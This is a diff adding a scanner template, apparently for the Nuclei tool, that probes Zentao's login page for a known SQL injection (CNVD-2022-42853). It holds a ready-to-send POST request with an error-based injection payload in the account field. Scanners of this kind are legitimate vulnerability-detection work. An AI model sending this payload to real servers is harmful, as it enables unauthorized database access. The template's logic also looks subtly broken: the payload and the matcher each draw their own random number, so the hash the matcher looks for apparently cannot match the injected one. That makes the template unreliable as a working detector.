@@ -1,0 +1,29 @@
+id: zentao-sql-injection-cnvd-2022-42853
+info:
+  name: Zentao SQL Injection CNVD-2022-42853
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SQL Injection vulnerability in Zentao allowing attackers to execute malicious SQL queries.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-42853
+
+http:
+  - raw:
+      - |
+        POST /zentao/user-login.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: http://{{Hostname}}/zentao/user-login.html
+
+        account=admin'+and+(select+extractvalue(1,concat(0x7e,(select+SUBSTR(MD5({{rand_int(100000,200000)}}),9,16)),0x7e)))#
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{substr(md5(to_string(rand_int(100000,200000))), 8, 16)}}"
